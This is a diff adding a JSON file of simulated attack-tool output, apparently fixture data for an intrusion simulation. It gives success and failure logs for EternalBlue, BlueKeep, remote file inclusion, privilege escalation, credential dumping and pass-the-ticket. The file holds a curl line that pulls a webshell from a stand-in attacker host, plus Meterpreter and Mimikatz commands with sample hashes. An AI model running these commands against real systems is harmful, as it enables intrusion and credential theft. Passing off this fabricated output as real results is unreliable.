@@ -1,0 +1,73 @@
+{
+  "ExploitEternalBlue": {
+    "success": [
+      "[*] Started reverse TCP handler on 10.0.0.1:4444\n[*] 10.0.1.3:445 - Connecting to target for exploitation.\n[*] 10.0.1.3:445 - Sending all but last fragment of exploit packet\n[*] 10.0.1.3:445 - Starting non-paged pool grooming\n[+] 10.0.1.3:445 - Sending SMBv2 buffers\n[+] 10.0.1.3:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 10.0.1.3:445 - Sending final SMBv2 buffers.\n[*] 10.0.1.3:445 - Sending last fragment of exploit packet!\n[*] 10.0.1.3:445 - Receiving response from exploit packet\n[+] 10.0.1.3:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 10.0.1.3:445 - Sending egg to corrupted connection.\n[*] 10.0.1.3:445 - Triggering free of corrupted buffer.\n[*] Sending stage (200262 bytes) to 10.0.1.3\n[*] Meterpreter session 1 opened (10.0.0.1:4444 -> 10.0.1.3:1042)\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM",
+      "[*] Started reverse TCP handler on 10.0.0.1:4444\n[*] 10.0.0.7:445 - Sending all but last fragment of exploit packet\n[+] 10.0.0.7:445 - ETERNALBLUE overwrite completed successfully!\n[*] Sending stage (200774 bytes) to 10.0.0.7\n[*] Meterpreter session 2 opened -> 10.0.0.7:49217\nmeterpreter > sysinfo\nComputer: CORP-WORKSTATION-04\nOS: Windows 7 (6.1 Build 7601, Service Pack 1)\nMeterpreter: x64/windows"
+    ],
+    "failure": [
+      "[-] 10.0.1.5:445 - Exploit aborted due to failure: no-target: This module only works against vulnerable Windows 7 targets.\n[-] Exploit failed: Rex::ConnectionRefused.",
+      "[*] 10.0.1.2:445 - Connection timed out waiting for target...\n[-] Exploit failed [timed-out]: Rex::ConnectionTimeout\n[*] Exploit completed, but no session was created.",
+      "[*] Started reverse TCP handler\n[*] Sending all but last fragment of exploit packet\n[-] Failed to get a shell. The target may not be vulnerable.\n[*] Exploit completed, but no session was created."
+    ]
+  },
+  "ExploitBlueKeep": {
+    "success": [
+      "[*] Started reverse TCP handler on 0.0.0.0:4444\n[*] Running automatic check (disable AutoCheck to override)\n[+] The target is vulnerable.\n[*] 10.0.0.12:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028e00000, Channel count 1.\n[*] Sending memory grooming packets...\n[+] Triggering kernel UAF. Success!\n[*] Meterpreter session 3 opened (10.0.0.1:4444 -> 10.0.0.12:49845)\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM"
+    ],
+    "failure": [
+      "[*] Running automatic check...\n[-] The target is not exploitable. Windows RDP does not appear to be vulnerable.\n[-] Exploit aborted due to failure: not-vulnerable.",
+      "[*] Started reverse TCP handler\n[*] Triggering kernel UAF...\n[-] Exploit failed with unexpected BSOD. Host may have crashed.\n[*] No session was created."
+    ]
+  },
+  "ExploitHTTP_RFI": {
+    "success": [
+      "[*] Started reverse TCP handler on 0.0.0.0:4444\n[*] Sending stage to 10.0.1.4\n[*] Meterpreter session 4 opened (10.0.0.1:4444 -> 10.0.1.4:34512)\nmeterpreter > sysinfo\nComputer: webserver-prod\nOS: Linux Ubuntu 18.04\nMeterpreter: x86/linux",
+      "$ curl 'http://10.0.0.8/index.php?page=http://attacker.com/shell.txt'\n[+] RFI successful. Webshell active at /tmp/.cache/sess_x7k2\n[*] Upgrading to Meterpreter...\n[*] Meterpreter session 5 opened"
+    ],
+    "failure": [
+      "[*] Attempting RFI via GET parameter 'page'...\n[-] Server returned 403 Forbidden. Remote file inclusion blocked by WAF.",
+      "curl: (7) Failed to connect to 10.0.1.4 port 80: Connection refused\n[-] HTTP connection failed. Target service may be down."
+    ]
+  },
+  "ExploitRemoteService": {
+    "success": [
+      "[*] Started reverse TCP handler on 0.0.0.0:4444\n[*] Command shell session 6 opened (10.0.0.1:4444 -> 10.0.0.3:42001)\nshell> whoami\nwww-data\nshell> id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+      "[*] Meterpreter session 7 opened\nmeterpreter > getuid\nServer username: apache\nmeterpreter > getpid\nCurrent pid: 14422"
+    ],
+    "failure": [
+      "[-] Exploit failed [unreachable]: Rex::ConnectionRefused connect(2) for '10.0.1.6' port 22",
+      "[*] Auxiliary module execution completed\n[-] No session created. Service returned unexpected banner.",
+      "FATAL: Remote host closed connection during handshake\n[-] Exploit failed with SSL error."
+    ]
+  },
+  "PrivilegeEscalate": {
+    "success": [
+      "meterpreter > getsystem\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM",
+      "[*] Trying exploit/windows/local/ms16_032_secondary_logon_handle_privesc\n[+] Deleted C:\\Windows\\Temp\\bqeHmG.exe\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Meterpreter session upgraded to SYSTEM."
+    ],
+    "failure": [
+      "meterpreter > getsystem\n[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:\n[-] Named Pipe Impersonation (In Memory/Admin)\n[-] Named Pipe Impersonation (Dropper/Admin)\n[-] Token Duplication (In Memory/Admin)",
+      "[-] Exploit failed: The target does not appear to be vulnerable (patched)."
+    ]
+  },
+  "DumpLSASS": {
+    "success": [
+      "meterpreter > hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\njohn.doe:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::\nsvc_backup:1104:aad3b435b51404eeaad3b435b51404ee:db0edd04aaac4506f7f36b027c3f8f83:::",
+      "[*] Executing Mimikatz...\nsekurlsa::logonpasswords\n\nAuthentication Id : 0 ; 248731\nSession          : Interactive from 1\nUser Name        : Administrator\nDomain           : CORP\nLogon Server     : DC01\nLogon Time       : 3/31/2026 8:14:03 AM\nSID              : S-1-5-21-3623811015-3361044348-30300820-500\n\t[00010000] CredentialKeys\n\t * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0\n\t * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709\n\t[00000003] Primary\n\t * Username : Administrator\n\t * Domain   : CORP\n\t * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0"
+    ],
+    "failure": [
+      "meterpreter > hashdump\n[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.\n[-] Failed to dump LSA secrets — EDR blocking memory reads on lsass.exe",
+      "[*] Attempting to dump credentials via Mimikatz...\n[-] ERROR kuhl_m_sekurlsa_acquireLSA -> LSA Protected mode detected. Cannot dump credentials."
+    ]
+  },
+  "PassTheTicket": {
+    "success": [
+      "[*] Kerberos session opened using TGT for CORP\\Administrator\n[*] Successfully imported ticket: Administrator@CORP\n[*] Lateral movement successful. Remote session established to 10.0.1.1:445.",
+      "mimikatz > kerberos::ptt ticket.kirbi\n\n* File: 'ticket.kirbi': OK\n\nkerberos::list\n[00000000] - 0x00000012 - aes256_hmac\n   Start/End/MaxRenew: ...\n   Server Name: krbtgt/CORP @ CORP\n   Client Name: Administrator @ CORP\n   Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable\n[+] Ticket successfully imported. Access granted."
+    ],
+    "failure": [
+      "mimikatz > kerberos::ptt ticket.kirbi\n[-] ERROR: Ticket not accepted by KDC (KRB5KDC_ERR_TGT_REVOKED). Keys may have been rotated.",
+      "[*] Attempting Pass-The-Ticket...\n[-] KDC_ERR_PREAUTH_REQUIRED — Ticket timestamp expired or keys rotated. Re-dump required."
+    ]
+  }
+}
